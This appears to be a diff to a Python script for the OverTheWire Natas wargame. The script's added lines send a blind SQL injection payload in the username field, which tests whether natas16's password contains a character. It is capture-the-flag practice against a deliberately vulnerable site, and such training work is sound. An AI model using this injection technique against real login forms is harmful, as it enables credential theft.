@@ -51,3 +51,13 @@ response = session.post(URL, data=data2)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
 # the attack that we can perform here is a blind SQL injection attack
+
+# example attack
+# the following means that the password of natas16 contains the character 'a'
+data = {
+    'username' : 'natas16" and password like "%a%" #A ',
+    'submit' : 'submit'
+}
+response = session.post(URL, data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
